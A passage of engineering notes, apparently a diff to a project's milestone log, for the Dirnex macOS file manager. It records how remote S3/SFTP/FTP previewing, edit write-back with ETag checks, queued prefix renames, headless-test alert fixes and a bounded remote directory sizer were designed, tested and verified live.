+  truncated file renders as a damaged document, not as an error. Probe 1's stated worry, arriving one
+  fix later than expected.
+- SFTP needed one thing the other two did not: only its interactive (password) path was ever
+  time-bounded, so the key-auth path waits on `.distantFuture` and cancellation is the *only* thing
+  that can interrupt it.
+
+**The app pass landed 2026-08-14**, and both decisions the probes settled are in it: the deferred
+sheet sits at **1200 ms**, which clears probe 5's 0.51 s floor with room for an endpoint twice as far
+away, and `RemoteFileCache` removes a cancelled fetch's partial rather than keeping it. ⌘Y / ⌃Q, ⏎
+and F4 all work on SFTP, FTP and S3 alike; a save is offered back up with the server re-`stat`ed
+first. +25 app tests (2358 core, 444 app, both linters clean), three headless negative controls and
+one live one, and 19 strings in all 14 catalogs.
+
+- **Nothing is spent on cursor movement, and that is *structural* rather than a rule somebody keeps.**
+  The passive path (`cachedRemoteFileURL` → `RemoteFileCache.cachedURL(for:)`) does not take a
+  backend at all, and its freshness check reads the revision off the `FileEntry` the pane is already
+  drawing — so it costs nothing, where the archive cache's equivalent affords a `stat` because an
+  archive's `stat` is a syscall and a remote one is half a second and a bill. `showActivePreview`
+  therefore has an `openRemotePreview` on its `unlocking` branch and *no* counterpart on the other,
+  which is the difference from `+ArchivePreview` worth noticing when reading the two side by side.
+- **The write-back's `stat` happens before the sheet, not after the user agrees** — so the sentence
+  being agreed to is the true one, and the four `RemoteRevisionEvidence` cases become four different
+  sentences instead of a confidence number. Six distinct bodies, asserted as six distinct strings:
+  matching a phrase would pass on the sentence saying the opposite. (The four unchanged ones, and
+  the grading behind them, were removed on 2026-08-23 — ▸ After M19.)
+- **A successful upload re-baselines the recorded revision, and this is not optional.** Leaving the
+  pre-upload one makes our *own* write read back as "someone else has edited it" on the next save —
+  the one sentence in this feature that must never be wrong. It costs one extra request, and a
+  failed re-read drops the entry rather than keeping a stale revision, since "cannot tell" is true
+  where a stale one is confidently false.
+- **F4's key and its menu validator had *already* drifted, before this slice touched them.** The key
+  routed an archive member to its extracted copy (§M4) while `validateEditItem` still answered
+  `backend == .local`, so Edit was gray inside an archive — and a disabled `NSMenuItem` swallows its
+  own key equivalent, so F4 was dead there. Adding the remote branch beside it would have made that
+  two misses instead of one. One `editRoute(for:)` now answers for both, verified live: **Edit with
+  TextEdit / F4 enabled on a member of a `pkg.zip`**.
+- **The negative controls each fired on exactly their own assertions.** Dropping the revision stamp
+  failed the two staleness tests and left every request count at zero; never serving a cached copy
+  failed reuse and re-baselining and left staleness untouched; keeping the partial failed only the
+  cancelled-fetch assertion. And reintroducing Slice 8's `<Key>` trim killed the **live**
+  whitespace-key test with `notFound` on `/dirnex-live-probe/slice10/trailing` — Slice 8's symptom
+  verbatim, on a test that addresses the object through the path the listing produced rather than
+  re-typing the one it uploaded.
+- The placeholder card was rendered to a bitmap and looked at (it cannot be judged any other way),
+  at 420 pt and at 300 pt: glyph, name, size and a hint naming ⌘Y and ⏎, wrapping inside its bound
+  rather than overrunning it. `BlockingWork` became `public` — the transports block on a subprocess,
+  so a fetch started from an AppKit controller is exactly the shape that type argues about, and a
+  second spelling in the app would be the one place the reasoning is not written down.
+
+**Live in the app, 2026-08-14 — and ⌘Y previewed nothing.** The slice had been verified by tests
+(headless, live-integration and one bitmap) and never by pressing its keys, so this run did that
+against the saved S3 account: ⌃Q drew the placeholder card on cursor movement and fetched when
+switched on, ⏎ opened the object in TextEdit under its real name, F4 edited it, and the save came
+back up with the re-baseline holding — a second save read "still has the size and modification date
+it had", not "someone else has edited it". **⌘Y was the one that failed**, and it is this milestone's
+most-repeated finding once more: `quickViewSourceURL` grew a remote branch at the app pass while
+`quickLookURL(for:)` — the *other* resolver of the same question, the one the `QLPreviewPanel` data
+source reads — kept its archive-only copy. So ⌘Y spent the download (the key does ask for one) and
+then showed **“No items selected”** for a row the Quick View surface beside it was drawing
+perfectly. The placeholder card names ⌘Y in its own hint, so the app was telling the user to press
+the key that showed nothing.
+
+- **The fix is a name and a deferral, not a third branch**: `previewsCursorFileOnly` (archive *or*
+  remote — one file, the one under the cursor, once its bytes are here) and a resolver that hands
+  everything non-local to `quickViewSourceURL` instead of resolving a second time. +4 app tests; the
+  control neutered the predicate back to `isArchive` and failed on exactly the four remote backends
+  while both local tests stayed green.
+- **What isolated it was a *cached* row.** Pressing ⌘Y on an object whose bytes were already on
+  disk still said "No items selected", which removes the fetch from the question entirely and points
+  at the data source. Worth reaching for whenever a surface that depends on a transfer looks broken.
+- **The empty panel on an un-fetched row is deliberate and is the cost.** Quick Look is Apple's
+  window and cannot be handed our placeholder card, and `refreshQuickLookIfVisible` runs on every
+  cursor step — so fetching there would be the arrow-key spend the whole slice is built to avoid.
+  Re-verified after the fix: arrowing onto an un-fetched row leaves the panel empty and downloads
+  nothing. Said out loud in that function's doc comment, since "add the remote counterpart here" is
+  the natural-looking edit that would undo the rule.
+
+**The ETag field has a producer, 2026-08-14.** It shipped at the core pass with none — named above as
+changing `isSuperseded(by:)`'s *rule* rather than its inputs — and S3 sends `<ETag>` on every
+`ListObjectsV2` row, which is the same response a row is already built from, so the strongest
+comparison available costs no request. `FileEntry.entityTag` carries it (defaulted, so every other
+producer is untouched), `S3ListingParser` keeps it **with its quotes** through both the listing path
+and the `entry(forKey:in:at:)` path `stat` uses, and `RemoteFileRevision(_ entry:)` reads it. +6 core
+tests, 2364 core / 452 app green, both linters clean.
+
+- **Two producers means two controls, and each fired on its own half**: dropping the parser's `ETag`
+  case failed the five parser-side assertions while the revision tests (which build entries by hand)
+  stayed green, and making the revision ignore `entry.entityTag` failed exactly the two revision
+  tests while the parser's stayed green.
+- **The live suite caught the change itself, in the informative direction.** Its untouched-object
+  test asserted `.sizeAndTimestamp` — the honest answer while nothing supplied a tag — and now reads
+  `.entityTag` against the real third-party endpoint, which is the measurement that says that
+  endpoint really does send them. It now also pins that the tag is non-`nil` and that both readings
+  carry the *same* one, so the evidence case cannot pass by both sides being empty.
+- **The visible half is a sentence that had never been reachable.** `.entityTag`'s body — "The file
+  on the server is byte-for-byte the one you downloaded" — was dead code with a full set of
+  translations. Live now on every save: the F4 → edit → ⌘S sheet draws it, and a second save after
+  an upload draws it again rather than reporting our own write as somebody else's.
+- The tag is opaque and compared only against another reading of the *same* object — an AWS tag is
+  an MD5 for a single-part upload and a digest-of-digests with `-<parts>` for a multipart one — so
+  the parser keeps it verbatim and nothing reads into it. An empty `<ETag>` is `nil` rather than
+  `""`, or two tag-less objects would compare equal and be read as proof neither had changed.
+
+**Rename's two spellings, 2026-08-14 — the fifth instance, and the first that was wrong in both
+directions at once.** Found while verifying this slice live: with the cursor on an S3 object,
+File ▸ Rename… and Multi-Rename were **gray while F2 itself worked**. `S3Backend` advertised
+`[.read, .write]` with `moveItem` implemented since the write half shipped — a miss, not a decision,
+since FTP and SFTP have carried `.rename` since they shipped and the live bucket already held an
+object renamed through the UI — so it is `[.read, .write, .rename]` now. But the capability was only
+the half that was *visible*: `beginRename` and `beginMultiRename` guarded on `backend.capabilities`,
+the composite's backend-wide set, which is always the **local** backend's, while `validateMenuItem`
+asked `capabilities(for: panel.path)`. Both compile everywhere and they are different questions.
+One predicate — `canRenameHere`, carrying `!isVirtualDirectory` as its second half — is what the two
+flows and the two menu items now all read. +4 tests (`RenameReachTests`, plus a live one), 2364 core
+/ 456 app green, both linters clean.
+
+- **The other direction was the merged iCloud listing, and nothing had reported it**: the item was
+  *enabled* over a flow that returned in silence, because those rows are ordinary local files (so the
+  capability says yes) inside a listing with no directory of its own. Graying it is the honest answer
+  — half those rows are an app's `Documents` folder wearing the app's name, which is not what
+  renaming them would do. Fixed by the same predicate, in the same edit.
+- **Three negative controls, each failing only its own assertions**: withdrawing `.rename` from
+  `S3Backend` (the capability tests, plus the connected-bucket rows), reverting the two flows to
+  `backend.capabilities` (only the key's refusals, and only where the two sets differ), and dropping
+  `!isVirtualDirectory` from the predicate (only the iCloud row, in all three tests).
+- **A fourth control is deliberately absent and the reason is recorded in the suite**: a reverted
+  `beginMultiRename` presents an app-modal window from the test host, which **wedges** the run
+  instead of failing it. The F2 half is drivable and needs `loadViewIfNeeded()` to mean anything —
+  measured, without it the whole suite passes against a reverted flow, because an unloaded pane's
+  table has no columns and the flow returns one guard later.
+- **Verified live against the saved account**: the item is enabled on an object, and renaming through
+  it re-lists with the new name, the same 42 bytes, a fresh `LastModified`, and the old key gone.
+- **The folder caveat is measured rather than inferred, and it is unchanged by any of this.** F2 on a
+  prefix draws «Can't rename "docs" — The system reported an error (code 18)»: `moveItem` answers
+  `EXDEV` for a prefix, which is the request `CopyEngine` runs as a recursive copy-then-delete, and
+  inline rename calls the primitive directly. Nothing is written (the folder is untouched
+  afterwards), and it was reachable by key before this change; what is new is that the menu item now
+  reaches it too. Worth a decision of its own — either a named `VFSUnsupportedReason` in place of the
+  raw errno, or routing a prefix rename onto the operation queue. **Taken 2026-08-14, the second
+  way** (below).
+
+**A folder rename runs as a job, 2026-08-14 — the caveat above, answered.** F2 and ⇧F2 on an S3
+prefix now do the thing rather than name the reason they cannot: `EXDEV` is handed to the queue,
+which already knows how to finish it. `FileOperation.renamedTo` with its
+`init(renaming:to:in:)`, one line in `CopyEngine`, `PanelViewController+RenameQueue` and one
+`submit(_:)` both transfer paths share; +7 core tests, +4 app tests, 2371 core / 460 app green,
+both linters clean, 4 strings in all 14 catalogs.
+
+- **Nothing new moves bytes, which is the whole reason it was affordable.** `moveItem` has answered
+  `EXDEV` for a prefix since Slice 4, and `CopyEngine.perform` has turned that into a recursive
+  copy-then-delete for longer than S3 has existed here — with a determinate bar, Stop, the conflict
+  policy, per-item failures and an undo record from the outcomes. What was missing was a job that
+  lands its **one** source under a *different* name, which is four lines of value type.
+- **A field on a `.move`, not a `Kind` of its own.** A rename that reaches the queue *is* a move; a
+  `.rename` kind would fork every `switch` over `Kind` — four label sites in the app, the undo
+  journal's label map, `CopyEngine`'s own `kind == .move` tests — to change a caption on a job whose
+  behavior is identical. Only `init(renaming:to:in:)` sets the field, so "several sources under one
+  new name" is unrepresentable rather than merely undocumented, and the queue bar's "Move" is
+  preceded by a confirmation that says what is really about to happen.
+- **The confirmation is not politeness.** A prefix rename is N billed copies and N deletes with no
+  atomicity available at any layer (§ the permanent consequences above), so the sheet says so —
+  including that stopping partway leaves some items under each name, which is the one outcome a user
+  cannot infer from a progress bar. F2 on a local folder is untouched: a local rename never crosses
+  a volume, so it never reaches this.
+- **The undo half was a guard resting on an invariant this change retires**, and it is the milestone's
+  own lesson arriving in the core rather than the app. `UndoJournal.crossVolumeRestore` required
+  `from.lastComponent == to.lastComponent`, with the reason written out — "a rename never crosses
+  volumes, so it never gets here" — so ⌘Z on a queued rename would have refused **exactly** the
+  operation it was reached for, `EXDEV` on a restore that had nothing wrong with it. It now builds
+  the same rename operation, which for a same-name move is `entry.name`: one path, no branch, and no
+  invariant left for the next backend to break. The tell to grep for is a comment explaining why two
+  things *cannot* collide (docs/NOTES.md ▸ Design lessons).
+- **⇧F2 came with it rather than after it.** Multi-rename swallowed the same `EXDEV` into "Couldn't
+  rename 3 items — The other items were renamed", so fixing F2 alone would have been this milestone's
+  most-repeated finding once more. Both flows now classify through one `RenameDeferral` and enqueue
+  through one funnel; the batch's *other* failures are reported from the confirmation's completion,
+  since a second sheet raised on a window that already has one is queued invisibly.
+- **What the app tests can and cannot reach, said out loud in the suite.** The classification and the
+  operation are pinned headlessly — including that the job takes the **row's own** directory, which
+  in a tree is not the pane's, the second-index-space trap inline rename already hit for real. The
+  flow itself is not driven: it ends in a confirmation, and on a window-less pane that is
+  `NSAlert.runModal()`, which **wedges** a run rather than failing it (`RenameReachTests` measured
+  that cost for ⇧F2's modal window). The keystroke is verified live instead.
+- **Two negative controls, each failing only its own assertions**: reverting `CopyEngine` to
+  `entry.name` failed the four rename tests while the ordinary-move and `landingName` ones stayed
+  green, and restoring `crossVolumeRestore`'s name guard failed exactly the undo test — with the
+  reoccupied-name test still passing, which is what says the guard that was removed was the right
+  one.
+- `UndoJournal.swift` reached SwiftLint's 500-line ceiling on the way, and was split by concept
+  rather than shaved: `UndoJournal+Revert.swift` now holds everything that touches bytes, leaving the
+  stacks and the record builders behind. (`swiftformat --lint` had also been failing on
+  `S3AccountLiveIntegrationTests.swift` since the previous commit; fixed in passing.)
+
+**Verified live against the real third-party bucket**, with the server's own listing as the judge
+rather than the pane's. A `renameprobe/` prefix holding `alpha.txt` and `sub/beta.txt`: F2 → the
+sheet reads «Rename "renameprobe" to "renamed-probe"?» → the queue bar shows *Moving renameprobe* →
+the pane re-lists under the new name, and an independent `ListObjectsV2` holds
+`renamed-probe/alpha.txt` and `renamed-probe/sub/beta.txt` with `renameprobe/` gone and the bytes
+intact. Then three more, because each is a branch the tests cannot drive: **⌘Z** put the whole
+subtree back under `renameprobe/` (the widened `crossVolumeRestore`, live); **Cancel** wrote nothing
+at all — no `should-not-happen` key anywhere in the bucket; and **⇧F2** raised the identical sheet
+through the batch path and landed `batchprobe/` with both files. Probe data removed afterwards.
+
+**The run also found a real bug in the app, and it was found by the *user watching the screen*.** The
+full suite had begun failing `S3AccountLiveIntegrationTests`' first test — 72 s and 209 s on two runs
+against 1.2 s alone — and three controls pointed at parallel load (skip the new tests → green;
+skip `RenameReachTests` instead → green; `-parallel-testing-enabled NO` → all green), which was a
+plausible reading and the wrong one. Oleg reported dismissing **six modal alerts, one after another,
+from a single test-host run**, and their titles are `RenameReachTests`' fixture table read aloud:
+«Can't open "dir" — Not connected to s3://AKIAEXAMPLE@…», `pkg.zip`, `search:/Results`,
+`trash:/Trash`, `icloud:/`.
+
+`viewDidLoad` → `activateTab()` → `navigate(to:)`, and a failed listing ends at
+`presentLoadFailure`, whose `runModal` fallback fires whenever the pane has **no window** — which is
+every pane a headless suite builds. So the suite that has to call `loadViewIfNeeded()` (§ the rename
+reach fix, one commit earlier) put an app-modal alert on screen for each non-local row and **blocked
+the whole process until a human clicked OK**. The "timeout" was the live suite waiting behind them;
+the run's duration was measuring reaction time.
+
+- **Fixed by not raising it at all with no window.** This is the one alert that fires *unasked* — a
+  navigation the app performs on its own — so a pane nobody can see has nobody to tell, and the
+  same shape is reachable in the app during launch restoration, before `showWindow`. A pane on
+  screen still gets its sheet.
+- **Measured both ways**: 459 green in **16.2 s** with the guard, and the reverted version put the
+  identical queue of alerts back, taking **111 s for eight tests** — all of it dismissing dialogs.
+  That also retires the parallel-load theory: every earlier timing, including the three "controls",
+  was reaction time.
+- **The lesson is about the instrument.** Three headless controls agreed on a wrong cause, because
+  each of them changes *how much runs* and none of them can see a window. The signal that settled it
+  was a person looking at the screen — the same class as the menu-bar claim M20 shipped and the
+  `.stringsdata` sweep that never ran. Recorded in docs/NOTES.md ▸ Testing.
+- **The other 48 `runModal` fallbacks were audited, and the question that sorts them is "who is
+  waiting for the answer?"** Three kinds share one `else runModal()`: a **user** pressed something
+  (the great majority — keep the fallback, a detached alert beats no answer); a **blocked worker** is
+  parked on it (`ConflictDialog`, `ErrorDialog`, called from the copy thread — here `runModal` is
+  *required*, since dropping it hangs the job or silently picks a resolution); and **nobody** is,
+  because the app raised it on its own schedule. Only the third is the bug, and it was six sites:
+  the load failure, both write-back offers (a watcher notices the editor's save), and the queue's
+  failure / pack / checksum reports — plus `presentIssues`, dual-triggered by ⌘Z *and* a
+  recursive-apply job. All six now share `NSAlert.beginSheetIfVisible(over:)`, so the rule lives in
+  one doc comment instead of six copies of `if let window`, and they gain `sheetHost(over:)` — a
+  report landing while a dialog is up attaches to that dialog rather than queueing invisibly behind
+  it. Two launch-time one-shots (the displaced-script notice, the Full Disk Access wall) are
+  unprompted too and were left alone on purpose: each is handed a window by construction and each is
+  marked shown once presented, so dropping one would consume it in silence. 459 green in 15.0 s
+  afterwards, with the screen watched.
+
+**The preview stopped following the cursor, 2026-08-14 — reported by a user, and the rule it was
+protecting was not the rule it was enforcing.** With Quick View up on a bucket root, entering
+`photos/` drew the placeholder card for the file inside and never resolved it: `showActivePreview`
+had `openRemotePreview` on its `unlocking` branch and *no* passive counterpart at all, so the only
+row a session ever fetched was whichever one the cursor happened to be on when the mode was switched
+on. The rule — "an arrow key never spends a billed request" — is real and is kept. What shipped
+instead was "one file per time you turn Quick View on", which is not a rule anybody could have
+discovered, and which read as the feature being broken. The fork was put to Oleg with three options
+(auto-fetch with bounds / explicit-only with a working affordance / fetch once per directory) and the
+first was chosen, paired with the card fix the third of them would still have needed.
+
+- **`RemoteFetchPurpose.cursorPreview` is the whole core change, and its point is that a refusal is
+  not a size.** It shares Preview's 16 MiB rather than minting a lower number that would mean nearly
+  the same thing — the argument the table's own doc comment already makes for open and edit — and
+  what differs is the new `RemoteFetchDecision.decline`: an automatic gesture over its threshold must
+  **not confirm**, because a dialog raised because the cursor came to rest somewhere is itself a
+  question nobody invited. `isAutomatic` names that rather than the one call site spelling
+  `== .cursorPreview`, so a second automatic gesture inherits the answer.
+- **Three bounds, and each is load-bearing on its own.** A 400 ms **settle delay** (a held arrow key
+  repeats every 30–90 ms, so travelling requests nothing); the **size cap that declines**; and
+  **abandonment when the cursor leaves**, which is what makes 16 MiB safe rather than merely small —
+  the user pays for the seconds they were looking at the row, not for the file. Single-flight is
+  structural: `RemoteFileCache` holds one pending fetch, because there is one preview and it follows
+  one cursor.
+- **The obvious cancellation test was worthless, and only a negative control showed it.** Every
+  assertion passed with `cancelAutomaticFetch` neutered to a bare `automatic = nil`, because a fake
+  backend that finishes inside the same turn is satisfied by the scheduler's identity guard and never
+  reaches the transfer. A `.block` outcome that sits until `isCancelled` — plus a record of whether
+  it was *told* to stop — is what pins the claim, and it fails on demand. Same shape as probe 1's
+  finding one pass earlier: `throws CancellationError` is not evidence that anything was interrupted.
+  The other two controls fired on exactly their own assertions (settle delay → five transfers for one
+  sweep; failure memory → a retry loop, `copyCount` 2).
+- **The card grew the state it always needed**, and the ⌘Y hint it used to carry was replaced: with
+  small files now arriving on their own, what remains on screen is a *large* one, so the card says
+  which of three things is true (over the threshold / size unreported / downloading / the attempt
+  failed) and carries a **Download** button — the one control exempted from the surface's blanket
+  "swallow the mouse", exempted at the *button* rather than the card so the exemption is exactly as
+  large as the affordance. It routes through `RemoteFetchPrompt.fetchConfirmed`, since the card draws
+  the name and the size directly above the button and `RemoteFetchPolicy`'s confirmation would be
+  asking a question the click has just answered.
+- **The ⌘Y panel gets the same fetch, which retires half of the cost recorded above.** That panel
+  used to be empty for *every* un-fetched row; now it is empty only for one over the cap, since Quick
+  Look is Apple's window and still cannot be handed our card. One transfer serves both surfaces, so
+  the landing re-drives both rather than taking a callback from whichever scheduled it.
+- **Verified live against the real bucket, in both directions.** The isolating run turns Quick View
+  on with the cursor on a *folder* — so the mode-on fetch does nothing and only the automatic path
+  can produce a preview — then arrows onto a file: the card resolved into a rendered preview. Then
+  the reported case itself: into `photos/` with the preview still up, and `one.txt` drew its
+  contents. The over-threshold half was reached by temporarily lowering the automatic threshold to
+  **4 bytes** and rebuilding, which is what put the real card on screen (glyph, name, size, sentence,
+  button) and let the button be clicked — one click, no confirmation, preview shown. 2383 core / 481
+  app green, both linters clean, 4 strings in all 14 catalogs.
+
+**The threshold became the user's, and the card learned to report, 2026-08-14 — asked for by the same
+user in the same breath as the report above.** A photographer working in 40–300 MB raw files is the
+case the 16 MiB cap is wrong for, and a fixed number cannot be right for both them and someone on a
+tethered connection; and a preview that fetches on its own has to say what it is doing, or a slow link
+is indistinguishable from the mode being broken again.
+
+- **The limit is a preference the *core* reads as data, not a constant it owns.**
+  `RemoteFetchPolicy` now takes the automatic cap rather than holding it, so the table keeps deciding
+  and Settings decides the number: `AppPreferences.quickViewFetchLimit`, in Settings ▸ Panels beside
+  the other Quick View row, defaulting to the 10 MiB the shipped behaviour already had. **Off** is a
+  real value and is why the card needed a fourth sentence — at a limit of 0 a 21-byte file is not
+  "this large", it is a mode the user turned off, and saying the former would read as arithmetic
+  nobody can argue with. An open preview re-evaluates on change, so the setting is not a
+  next-launch one.
+- **`decline` is what makes the limit safe to raise.** Nothing about a bigger number changes the rule
+  that an automatic gesture must not *ask*: over the cap the card appears and the user clicks, which
+  is the same one gesture at 10 MiB and at 300.
+- **Progress is a byte count the fetch already had, published rather than computed.**
+  `RemoteFileCache` counts what has landed, the card polls it, and the bar is **determinate** —
+  indeterminate would say "something is happening" where the honest answer is available. The readout
+  is suppressed until the first byte, since "Zero KB of 42 bytes" is a claim about the transfer that
+  is really a claim about the clock, and it borrows the queue bar's existing byte string rather than
+  minting a second spelling of the same sentence.
+- **Stop had to be *remembered*, and the first live run is what showed it.** A stopped fetch that
+  merely forgot itself would be restarted by the next cursor event, or — worse, on a small file —
+  leave the card claiming the file is too large. So the cancellation is recorded against the row and
+  the card says "Download stopped." over a Download button; the negative control (forget instead of
+  remember) fires as a retry loop, `copyCount` 2. Same asymmetry as `EditedFileRevision`: the state
+  worth keeping is the one the user asked for.
+- **Verified live against the real bucket, all four states.** The downloading card with its bar,
+  caption and Stop; Stop clicked mid-flight → "Download stopped." with the right size on a 42-byte
+  file and no restart on the next arrow key; completion → the text rendered; and, after restoring the
+  400 ms settle the probe had stretched to 8 s, the reported case again — into `docs/` with the
+  preview up, `notes.txt` drew its contents. 2387 core / 491 app green, both linters clean, all three
+  check scripts clean, 5 strings in all 14 catalogs.
+
+#### Slice 11 — 2026-08-14: Space-on-dir over a server
+
+The milestone has said since it opened that "every listing is a billable request, which makes the
+recursive sizer cost money over a bucket", filed under the permanent consequences. Nothing acted on
+it: `computeDirectorySize` had no backend gate at all, where the *auto* scan beside it
+(`areSizeBarsVisible`) has been `backend == .local` since M15. So Space on a prefix walked the whole
+subtree, and it was unstoppable by construction — `DirectoryLoader.size` passes no `isCancelled`
+*and* runs in a `Task.detached`, whose own doc comment says it deliberately outlives its caller's
+cancellation. Right for a local walk, where finishing costs nothing and banks a total; indefensible
+for one somebody is paying for.
+
+**Probed first, and the numbers are what decided the shape.** Against the live third-party account
+through the real `S3Backend` and the app's own `S3CurlTransport`:
+
+- **One `ListObjectsV2` per directory, serial, 0.601–0.699 s each** (mean 0.621) — Slice 10 probe 5's
+  0.51 s round-trip floor, once per folder. Ten directories cost **6.21 s**; extrapolated,
+  1000 is **10.3 minutes and 1000 billed requests**, 10 000 is 1.7 hours.
+- **Nothing was on screen while it ran.** The size column kept its dash, no spinner, no status line.
+- **The cooperative-pool worry did not reproduce, and that shrank the slice.** 32 concurrent remote
+  walks under `LIBDISPATCH_COOPERATIVE_POOL_STRICT=1` left a 50 ms heartbeat at a worst gap of
+  **56 ms**, against **57 ms** for the no-walk control — so this is not a `BlockingWork` case, and
+  the fix is about cost and cancellability rather than about where the walk runs. Worth recording as
+  a negative: the natural reading of NOTES.md ▸ Swift 6 says otherwise, and acting on it would have
+  been effort spent on a problem that is not there.
+
+**The decision the cost forces, and it is not the one a download gets.** A remote *fetch* can be
+confirmed against a number already on the row (`RemoteFetchPolicy`); a walk cannot, because finding
+out how many folders there are **is** the walk. So a pre-confirmation could only say "this might be
+expensive", which is a dialog people learn to click through. Space stays a gesture that spends —
+the app's own rule since Quick View, that the key somebody pressed may spend where the cursor may
+not — and the three things that make that affordable come off **one** value:
+
+- **Bounded.** `DirectorySizeBudget` (core, +10 tests) carries a `directoryLimit`, `nil` locally and
+  **1000** for anything `isRemoteConnection` — `S3Backend.pageLimit`'s number and its argument one
+  level up, past anything a person points at and short of billing indefinitely. It is checked
+  *before* the request, so the limit counts listings **made**: on a billed backend "refused" and
+  "made and then discarded" are different numbers. Exceeding it **throws**
+  `DirectorySizeBudgetExceeded` rather than returning the partial, for the reason a filtered-out row
+  is dropped rather than drawn as "Zero KB" — a partial rendered as the answer is a claim about the
+  folder where the truth is a claim about the question.
+- **Abandoned.** `abandonsWhenUnwatched` is *derived* from the limit rather than stored beside it,
+  because it is the same question — who pays for a walk nobody is waiting for — so a backend that
+  gains a budget gains the cancellation with it rather than needing a second edit somebody has to
+  remember. The pane keeps the task handle and cancels at the two `loadToken` bumps that mean it
+  moved (`navigate`, `activateTab`); a refresh of the same directory deliberately leaves a walk
+  alone, since its row is still on screen.
+- **Visible.** The size column gains two states a byte count cannot express — `…` while measuring,
+  `?` after a give-up — and the give-up's *sentence* goes to the status line, where prose has room.
+  A give-up drawing the same dash as "never measured" is the one that matters: it invites a re-press
+  that spends the whole budget again.
+
+The local walk is deliberately **untouched** — untracked, unbounded, still outliving the gesture —
+and that is pinned by a test of its own, because the easy wrong fix is to bound and cancel
+everything and throw away a total that costs nothing to finish.
+
++10 core tests and +16 app tests (2381 core / 475 app green, both linters clean, and all three
+`scripts/check_*.py` passing — the localization one is what proves the new key is extracted *and*
+in the catalogs, which is the wrapped-but-untranslated case no coverage test sees). One string in
+all 14 catalogs, verified in the compiled `.strings` rather than in the catalog. Four negative
+controls, each failing only its own assertions: `.unbounded` in place of the budget made the
+bottomless walk reach **9110 listings in 20 s** and still climbing where the fix stops at 1000;
+discarding the task handle without cancelling took a cancel-at-520 to 1001; collapsing the
+display states back to one dash failed exactly the two "distinguishable" assertions while the
+"unmeasured still draws a dash" one stayed green; and putting the over-long Russian back in the
+catalog failed the width test alone, naming `ru 713 pt` — which also proves that test reads the
+built bundle rather than the source catalog.
+
+**Verified live against the real endpoint** through the real backend and transport: a budget of 4
+over a ten-directory tree gave up after **exactly 4** listings (2.43 s), the unbounded control
+completed at 10 with the right total, and a cancel at 1.5 s left the count frozen at **3** through
+two further seconds of grace — the requests stopped rather than being ignored.
+
+**And verified live in the app**, against that same bucket through the running build. With the
+shipped budget: Space on the ten-folder `sizerprobe` prefix drew `…` in the size column — while
+`docs` and `photos` beside it kept their dashes — for the ~6 s the walk took, and the total landed
+at **10 KB**, ten folders carrying one 1 KiB file each. Then, on a throwaway build with the remote
+budget cut to 4 (1000 directories is a bucket nobody should create, so the give-up is unreachable
+otherwise): the same prefix came back `?` while a neighbouring `docs` completed at 42 bytes in the
+same listing, the status line carried its sentence whole, and hovering the `?` produced the
+tooltip, wrapped over three lines. The budget and the `NSLog` came back out afterwards and both
+suites were re-run against the restored source.
+
+- **The give-up sentence did not fit the line it goes to, and it took three measurements to
+  establish that — two of which were wrong.** The status label is `.byTruncatingTail` at
+  `.defaultLow` compression resistance, deliberately, so a long type-to-filter string cannot shove
+  the split divider across; the cost of that correct decision is that an over-long *sentence* loses
+  its **tail**, which in an explanatory sentence is the explanation. The first draft measured
+  **557 pt in English and 713 pt in Russian** against a pane of **542 pt**, so it clipped in
+  **10 of 14 languages** and put `Stopped measuring “x” — it holds more folders than Dirnex will…`
+  on screen.
+  - **Getting the available width is where this went wrong twice, and the second attempt was worse
+    than the first.** Subtracting an assumed sidebar from the window frame gave 532 — near enough,
+    and arrived at by exactly the derivation docs/NOTES.md forbids. "Correcting" it with an `NSLog`
+    of `statusLabel.frame.width` in the running app gave **409.5**, which looked authoritative and
+    is meaningless: the label is sized to its own text, so that number is the *sentence* plus 3.5 pt
+    of padding. Two consecutive logs give it away — `label` was always `sentence + 3.5`. The honest
+    instrument is the enclosing stack's width, and better still
+    `NSCell.expansionFrame(withFrame:in:)`, AppKit's own "is this truncated" asked of the real label
+    in the real pane: probed that way the first draft truncates and every candidate at ~496 pt and
+    below does not. **A live probe is not automatically a measurement of what you meant.**
+  - The residual is the **folder name**, which is unbounded — 40 characters puts even a short
+    sentence at 468 pt — so truncation here can be made unlikely and never impossible. That is what
+    settled the design rather than any single width: the short note stays on the status line and the
+    *reason* moves to a **tooltip** on the `?` cell, where nothing bounds it and where it outlives
+    the status line's four-second expiry. Until then the glyph was permanently unexplained for
+    anyone who looked away — the recorder pill's "prose belongs where its length is free" rule,
+    arriving on a table cell.
+  - `StatusSentenceWidthTests` pins the sentence at **400 pt against the measured 542**, the
+    headroom being deliberate: budgeting to the pane itself would pass a sentence that fits the
+    fixture's folder name and truncates on somebody's longer one. A sweep of all 18 sentences that
+    reach the status line found none of the others over.
+
+- **One test-design lesson, paid for twice.** The first version of the app suite installed a fixture
+  model on the pane straight after `loadViewIfNeeded()`, and `viewDidLoad` → `activateTab` →
+  `navigate` lists *asynchronously* — so a walk that finished in ~1 ms had its total wiped by the
+  arriving listing and read as "the size never landed", while the same test over a backend slow
+  enough to lose the race the other way passed. Taking the row from the pane's **own** listing
+  removes the race instead of widening a timeout around it. The sibling of it: the pane lists its
+  own directory on load, so a request count has to be read as a **delta** — asserting the raw count
+  read 1001 against a budget of 1000 and looked exactly like an off-by-one in the sizer, which it
+  was not.
+
+All three stop at one predicate today. `quickViewSourceURL` resolves a local path or an already
+extracted archive member and answers `nil` for anything else, so an S3 row previews nothing; F4 says
+«Only files on this Mac can be edited — copy it out first (F5)»; and ⏎ falls off the end of
+`activate`'s chain and does nothing whatsoever, with no message at all. The workaround is the round
+trip F4's own sentence describes, and automating it is what every other client in this space sells.
+
+**The shape is settled by what those clients do, and it is the FTP shape.** Cyberduck's Edit
+downloads to a temp directory, opens the preferred editor and uploads the revision on save — one
+funnel for S3, SFTP and WebDAV alike — and its space-bar Quick Look is that same fetch without the
+editor. Transmit is the same, down to uploading while its own window is hidden behind the editor's.
+The other family mounts the bucket (Mountain Duck, ExpanDrive, `rclone mount`) and is not ours to
+build: that is a File Provider extension, a different product with a different lifecycle. Nobody
+streams — an editor and a Quick Look plugin both want a real file, so every client pre-downloads.
+Dirnex already owns that machinery for archive members (§M4's extract → watch → offer → write back);
+this slice points it at a second kind of elsewhere.
+
+Three decisions taken before any code, each with the alternative it beat:
+
+- **Remote-generic, gated on `isRemoteConnection`.** SFTP and FTP arrive with S3: all three answer
+  `copyFile` in both directions and all three carry `acceptsUploads`. Writing it against `isS3`
+  would be the fourth instance of the finding this milestone keeps re-deriving — one question,
+  several spellings, and the compiler checks none of them.
+- **The cursor never downloads.** Quick View follows the cursor, so a preview that fetches on an
